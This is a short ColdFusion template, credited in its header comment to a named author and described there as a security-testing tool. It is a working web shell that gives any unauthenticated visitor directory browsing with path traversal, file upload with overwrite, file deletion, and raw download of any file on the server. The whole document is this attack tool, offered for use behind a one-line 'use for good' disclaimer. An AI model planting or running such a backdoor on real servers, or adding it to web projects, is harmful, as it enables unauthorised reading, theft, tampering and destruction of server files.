<!---
This Cold Fusion template is intended for testing security
on ColdFusion application servers. It will let a web user
upload, download and delete files on a server. 

Use this only for good, not evil.
Kevin Klinsky
kklinsky@themerge.com
--->

<CFPARAM NAME="DirPath" DEFAULT="#GetTempDirectory()#">
<CFSET THISTEMPLATE=GETFILEFROMPATH(GETTEMPLATEPATH())>

<CFIF LISTLAST("#DirPath#","\") IS ".">
	<CFSET DIRPATH=GETDIRECTORYFROMPATH(DIRPATH)>
<CFELSEIF LISTLAST("#DirPath#","\") IS "..">
	<CFSET DIRPATH=GETDIRECTORYFROMPATH(LEFT("#GetDirectoryFromPath(DirPath)#",LEN(GETDIRECTORYFROMPATH(DIRPATH))-1))>
</CFIF>

<CFIF ISDEFINED("uploadfile")>
	<CFIF LEN(UPLOADFILE) GT 0>
		<CFFILE ACTION="UPLOAD"
			FILEFIELD="uploadfile"
	 		DESTINATION="#DirPath#"
			NAMECONFLICT="OVERWRITE">
File uploaded<BR><BR>
	</CFIF>
</CFIF>

<CFIF ISDEFINED("deletefile")>
	<CFSET DELETEFILE=DIRPATH&DELETEFILE>
	<CFIF FILEEXISTS(DELETEFILE)>
		<CFFILE ACTION="DELETE"
 	       FILE="#deletefile#">
		File deleted<BR><BR>
	</CFIF>
</CFIF>



<CFIF GETFILEFROMPATH(DIRPATH) IS "" OR GETFILEFROMPATH(DIRPATH) IS ".">	
	<CFDIRECTORY DIRECTORY="#DirPath#"
		NAME=DIRDETAILS
		SORT="name ASC">
	<CFOUTPUT>
	<FONT SIZE="+2">#DirPath#</FONT><BR>
	</CFOUTPUT>
	<TABLE>
	<TR>
		<TD></TD>
		<TD>Name</TD>
		<TD ALIGN="right">Size</TD>
		<TD>Modified date</TD>
	</TR>
	<CFOUTPUT QUERY="DirDetails">
	<CFSET NEWPATH = URLENCODEDFORMAT(DIRPATH&NAME)>
	<CFIF TYPE IS "Dir" AND NAME IS NOT "." AND NAME IS NOT "..">
		<CFSET NEWPATH=NEWPATH&"\">
	</CFIF>
	<TR>
		<TD>[#Type#]</TD>
		<TD><A HREF="#ThisTemplate#?DirPath=#NewPath#">#Name#</A></TD>
		<TD ALIGN="right">#Size#</TD>
		<TD>#DateLastModified#</TD>
		<CFIF TYPE IS "File">
		<FORM ACTION="#ThisTemplate#?DirPath=#GetDirectoryFromPath(DirPath)#&deletefile=#URLEncodedFormat(Name)#" METHOD="post">
		<TD><INPUT TYPE="submit" VALUE="Delete"></TD>
		</FORM>
		</CFIF>
	</TR>
	</CFOUTPUT>
	</TABLE>
	<CFOUTPUT>
	<FORM ACTION="#ThisTemplate#?DirPath=#URLEncodedFormat(DirPath)#" ENCTYPE="multipart/form-data"  METHOD=POST>
	<INPUT TYPE="File" NAME="uploadfile" SIZE="30"><BR>
	<INPUT TYPE="submit" VALUE=" Upload ">
	</FORM>
	</CFOUTPUT>
<CFELSE>
<CFFILE ACTION="Read"
        FILE="#DirPath#"
        VARIABLE="var_name">	
<CFCONTENT TYPE="unknown:security.breach" FILE="#DirPath#" DELETEFILE="No">
</CFIF>